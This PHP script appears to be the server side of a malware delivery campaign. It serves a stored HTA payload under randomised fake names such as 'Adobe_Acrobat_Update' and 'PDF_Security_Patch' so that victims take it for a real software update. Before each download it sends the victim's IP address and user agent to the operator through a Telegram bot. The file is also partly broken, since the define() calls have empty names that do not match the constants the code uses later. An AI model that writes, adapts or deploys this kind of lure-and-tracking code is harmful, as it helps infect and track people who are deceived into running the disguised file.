<?php
// — TELEGRAM CONFIGURATION —
define('', 'YOUR_TELEGRAM_BOT_TOKEN_HERE'); 
define('',   'YOUR_TELEGRAM_CHAT_ID_HERE');   

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

function getIP() {
    foreach (['HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) return $_SERVER[$k];
    }
    return 'UNKNOWN';
}

function sendTelegram(string $text) {
    if (empty(TG_BOT_TOKEN)) return;
    $url = "https://api.telegram.org/bot" . TG_BOT_TOKEN . "/sendMessage";
    $payload = http_build_query(['chat_id' => TG_CHAT_ID, 'text' => $text, 'parse_mode' => 'HTML']);
    $ctx = stream_context_create(['http' => ['method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded\r\n", 'content' => $payload, 'timeout' => 10]]);
    @file_get_contents($url, false, $ctx);
}

// ROUTE: UNIQUE PAYLOAD DOWNLOAD (GET REQUEST)
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['route']) && $_GET['route'] === 'get-unique-payload') {
    
    // 1. Generate Unique Filename
    $themes = ['Adobe_Acrobat_Update', 'PDF_Security_Patch', 'Document_Viewer_Pro', 'Acrobat_DC_Setup'];
    $theme = $themes[array_rand($themes)];
    $uniqueId = str_pad(mt_rand(0, 999999), 6, '0', STR_PAD_LEFT);
    $filename = $theme . '_' . $uniqueId . '.hta';
    
    // 2. Define Master File Path (CRITICAL FOR RAILWAY)
    // Points to your payload/master.hta folder
    $masterPath = __DIR__ . '/payload/master.hta';
    
    // 3. Send Telegram Notification BEFORE Downloading
    $ip = getIP();
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    $tgMsg = "📥 <b>NEW PAYLOAD DOWNLOADED</b>\n\n" .
             "<b>Filename:</b> <code>{$filename}</code>\n" .
             "<b>IP Address:</b> <code>{$ip}</code>\n" .
             "<b>User Agent:</b> {$ua}\n" .
             "<b>Time:</b> " . date('Y-m-d H:i:s');
             
    sendTelegram($tgMsg);
    
    // 4. Serve the Master File as the Unique Name
    if (file_exists($masterPath) && is_readable($masterPath)) {
        while (ob_get_level()) ob_end_clean();
        
        header('Content-Type: application/hta');
        header('Content-Disposition: attachment; filename="' . $filename . '"');
        header('Content-Length: ' . filesize($masterPath));
        header('Cache-Control: no-cache, no-store, must-revalidate');
        
        readfile($masterPath);
        exit;
    } else {
        http_response_code(500);
        echo json_encode(['error' => 'Master payload not found at: ' . $masterPath]);
        exit;
    }
}

http_response_code(404);
echo json_encode(['error' => 'Endpoint not found']);
?>
